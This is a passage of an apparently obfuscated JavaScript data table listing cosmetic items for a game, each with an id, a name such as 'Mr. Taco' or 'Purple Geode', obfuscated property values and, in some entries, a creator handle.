					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⲆⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⵠⲆⵠᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⲆⲆΔᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃᐃΔⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "Communist & Taco4Life",
					name: "Mr. Bread 3"
				}, {
					id: 60,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔⲆΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⲆⲆⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔⲆΔⵠⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⵠⵠⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Red Berry"
				}, {
					id: 61,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃⲆⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔΔⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆᐃⵠᐃᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⲆᐃⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Berry"
				}, {
					id: 70,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆᐃΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆᐃᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔΔⲆⲆⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠᐃⲆΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Cake"
				}, {
					id: 71,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⲆⲆΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃᐃΔΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⵠⲆⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Christmas Cake"
				}, {
					id: 77,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠⵠΔⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆⲆⲆⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⵠΔⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆⲆⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "Pancakez",
					name: "Mr. Pancake"
				}, {
					id: 87,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃΔⵠᐃᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃᐃΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆⲆΔᐃΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⲆᐃΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Mr. Taco"
				}, {
					id: 78,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔᐃᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆᐃΔⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃⲆΔⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆΔᐃΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Mr. Bottle"
				}, {
					id: 79,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⲆⵠⲆᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃΔᐃⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆΔⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Mr. Bottle 2"
				}, {
					id: 97,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔΔⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⵠᐃᐃⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔⲆΔⵠⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠΔᐃⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Pink Rabbit"
				}, {
					id: 102,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆΔᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃᐃⵠⲆⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆΔⵠᐃᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔΔⲆⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Marshmallow"
				}, {
					id: 107,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔⵠⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠᐃΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠᐃΔᐃΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠᐃΔᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Fox"
				}, {
					id: 132,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆΔᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠᐃΔⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃⲆᐃΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔᐃⵠᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Raccoon"
				}, {
					id: 111,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆᐃΔⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠΔᐃΔᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⵠΔⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Cloud"
				}, {
					id: 113,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⲆⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⵠᐃΔᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⵠⲆⲆΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⵠⵠⵠᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Moon"
				}, {
					id: 117,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠⲆΔᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠΔᐃΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔᐃᐃⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⵠⵠᐃⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mr. Panda"
				}, {
					id: 118,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠⵠΔᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃΔΔΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠⲆⵠⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mr. Strawberry"
				}, {
					id: 119,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃⵠⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⲆᐃΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔΔΔΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⲆᐃΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "eogito & Sushuui",
					name: "Mummy"
				}, {
					id: 122,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⲆᐃⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆⲆᐃΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆⲆᐃⵠᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠΔΔⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Dino"
				}, {
					id: 127,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃΔⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔᐃᐃΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔⵠΔᐃⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⲆⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Mr. Koala"
				}, {
					id: 160,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⵠΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃΔΔΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃⲆⵠᐃⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⵠⲆᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bottle Protection"
				}, {
					id: 162,
					"ᐃΔⲆ": ⲆΔ.ΔΔᐃᐃⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆΔΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆΔΔΔΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃᐃᐃⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Leaf Man"
				}, {
					id: 166,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔⵠᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⵠΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃΔⵠᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃᐃⵠⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Bubble"
				}, {
					id: 174,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃΔⲆᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆⵠⵠᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃΔⲆⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⲆⲆⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[263],
					name: "Potato"
				}, {
					id: 171,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠΔⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔⵠⲆΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃⵠᐃⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⵠⲆΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[427],
					name: "Axolotl"
				}, {
					id: 178,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆⵠᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⲆⲆΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃⵠΔᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⵠΔΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Rusted Machine"
				}, {
					id: 179,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠΔⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠⵠΔᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⲆΔⲆⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃᐃΔⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Starving Machine"
				}, {
					id: 181,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠⵠᐃⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠⲆⲆΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠᐃᐃⲆⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃΔᐃᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Night Stars"
				}, {
					id: 191,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⵠᐃⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⲆᐃⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⵠⵠᐃⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃΔⲆⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Blue Jay"
				}, {
					id: 198,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⵠⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆᐃΔⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔⲆᐃᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⲆΔΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "AWTP",
					name: "Dave"
				}, {
					id: 200,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆΔᐃⵠΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔΔᐃΔᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⲆⲆΔⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "Jinty",
					name: "Smug"
				}, {
					id: 203,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃΔⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆᐃᐃⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔΔΔⲆⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⲆⲆⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Reclaimed"
				}, {
					id: 204,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠⵠᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔΔⲆΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⲆⲆⵠᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⲆᐃᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Legacy Wolf"
				}, {
					id: 211,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃⵠⲆⲆΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔΔⵠᐃΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⵠⲆΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⵠⲆⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Starver of the Seas"
				}, {
					id: 213,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠΔⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠᐃᐃΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⲆⵠᐃⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃᐃΔΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Ice"
				}, {
					id: 219,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔⲆΔⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆⲆᐃⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⵠΔⲆⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⲆⵠᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "Ramil",
					name: "Sandwich Cookie"
				}, {
					id: 221,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔᐃᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔΔⲆⲆⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⲆⲆⵠⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔⲆⲆⵠΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Purple Geode"
				}, {
					id: 222,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔΔⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠΔᐃⲆΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆᐃⵠⲆⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃᐃⵠⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Cyan Geode"
				}, {
					id: 223,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⵠΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔᐃᐃⲆⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆΔᐃⵠΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆΔⲆΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Yellow Geode"
				}, {
					id: 228,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⵠⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔⲆⵠᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⲆⵠΔΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⵠⲆⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Furnace Head"
				}, {
					id: 229,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔⲆⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⲆΔᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⲆΔΔⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠΔᐃⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bag"
				}, {
					id: 227,
					"ᐃΔⲆ": ⲆΔ.Ⲇᐃⵠᐃᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠᐃⲆᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⵠᐃⲆΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃΔⲆΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Lit Furnace Head"
				}, {
					id: 25,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃᐃΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔΔᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⵠⲆⵠΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⲆⲆᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[362],
					name: "Test Dummy"
				}, {
					id: 41,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆᐃΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠᐃⲆⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆΔⲆⲆⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⲆⵠⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Star-ver"
				}, {
					id: 43,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⲆⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔⲆⵠᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃⵠΔΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔᐃᐃΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Starver Chest"
				}, {
					id: 88,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⲆⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔᐃᐃⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃΔᐃᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠᐃⲆⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Starver Workbench"
				}, {
					id: 121,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆᐃΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔⲆⵠᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⵠᐃⵠⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠⵠΔⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Fish"
				}, {
					id: 39,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠΔⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔⵠᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔΔⵠⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠΔⲆⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "Negligent4Dia",
					name: "Crab"
				}, {
					id: 40,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔᐃΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃⵠⵠⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃᐃⲆⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⲆⲆⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "Negligent4Dia",
					name: "Piranha"
				}, {
					id: 36,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⲆⵠⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔᐃⵠᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⵠⲆᐃᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⵠⵠⵠᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Fox"
				}, {
					id: 69,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⵠᐃΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔΔΔΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⲆⵠⵠⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃⵠⵠⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "Zed",
					name: "Baby Foxy"
				}, {
					id: 51,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆᐃⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⵠᐃⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆΔⵠⲆΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⲆᐃⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "HOWI",
					name: "Winter Bear"
				}, {
					id: 133,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔΔᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆᐃⵠΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠΔⵠΔⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⵠᐃⵠΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Hawk"
				}, {
					id: 55,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠᐃΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⵠⵠⵠⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠᐃⵠΔᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆᐃⵠⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Nice Little Yuki"
				}, {
					id: 68,
					"ᐃΔⲆ": ⲆΔ.ᐃΔᐃⵠⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔΔⲆΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆᐃⵠⲆⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔᐃⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Baby Yuki"
				}, {
					id: 62,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⵠⵠΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⵠΔⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⲆᐃⵠΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⵠⵠΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Carrot"
				}, {
					id: 56,
